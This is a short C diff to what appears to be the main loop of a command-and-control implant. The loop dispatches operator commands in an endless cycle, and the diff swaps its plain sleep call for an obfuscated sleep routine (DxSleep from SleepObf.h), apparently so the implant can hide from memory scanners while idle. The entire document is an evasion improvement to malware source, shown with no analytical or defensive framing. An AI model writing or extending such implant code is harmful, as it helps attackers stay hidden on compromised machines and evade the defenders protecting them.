@@ -2,6 +2,7 @@
 
 #include <Core/Command.h>
 #include <Core/Transport.h>
+#include <Core/SleepObf.h>
 
 PINSTANCE Instance = & ( ( INSTANCE ) { } );
 
@@ -19,7 +20,7 @@ INT WINAPI WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLin
                 CommandDispatcher();
         }
 
-        Instance->Win32.WaitForSingleObjectEx( NtCurrentThread(), Instance->Config.Sleeping * 1000, FALSE );
+        DxSleep( Instance->Config.Sleeping * 1000 );
 
     } while ( TRUE );
 }
